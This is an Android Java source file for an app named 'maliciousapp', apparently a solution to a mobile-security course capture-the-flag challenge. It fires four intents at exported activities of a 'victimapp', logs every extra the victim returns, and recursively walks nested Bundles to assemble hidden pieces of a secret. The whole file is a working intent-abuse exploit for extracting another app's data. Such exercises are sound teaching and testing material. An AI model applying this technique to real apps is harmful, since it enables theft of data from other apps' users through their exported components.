package com.example.maliciousapp;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.util.Iterator;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onStart() {
        super.onStart();

        ActivityResultLauncher<Intent> someActivityResultLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                result -> {

                    Intent data = result.getData();
                    assert data != null;
                    if(result.getResultCode() != 4) {
                        for (String p : data.getExtras().keySet()) {
                            Log.i(TAG, "key: " + p + " value: " + data.getExtras().getString(p));
                        }
                    }

                    if(result.getResultCode() == 4){

                        Bundle b1 = (Bundle) data.getExtras().getBundle("follow");
                        String mykey = "";
                        StringBuilder message = new StringBuilder();
                        Iterator<String> t = b1.keySet().iterator();

                        while(true) {
                            while (t.hasNext()) {
                                mykey = t.next();
                                message.append(mykey);
                                Log.i(TAG, "key (last piece):" + mykey + " value " + b1.getString(mykey));
                            }
                            try {
                                b1 = (Bundle) b1.getBundle(mykey);
                                t = b1.keySet().iterator();
                            } catch(NullPointerException | ClassCastException cce){
                                Log.i(TAG, "casting failure or nullpointer");
                                break;
                            }
                        }
                    }

                });

        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.PartOne"));
        if (intent1.resolveActivity(getPackageManager()) != null) {
            intent1.putExtra("requestCode", 1);
            someActivityResultLauncher.launch(intent1);
        }

        Intent intent2 = new Intent("com.example.victimapp.intent.action.JUSTASK");
        if (intent2.resolveActivity(getPackageManager()) != null) {
            intent2.putExtra("requestCode", 2);
            someActivityResultLauncher.launch(intent2);
        }

        Intent intent3 = new Intent();
        intent3.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.PartThree"));
        if (intent3.resolveActivity(getPackageManager()) != null) {
            intent3.putExtra("requestCode", 3);
            someActivityResultLauncher.launch(intent3);
        }

        Intent intent4 = new Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE");
        if (intent4.resolveActivity(getPackageManager()) != null) {
            intent4.putExtra("requestCode", 4);
            someActivityResultLauncher.launch(intent4);
        }

    }

}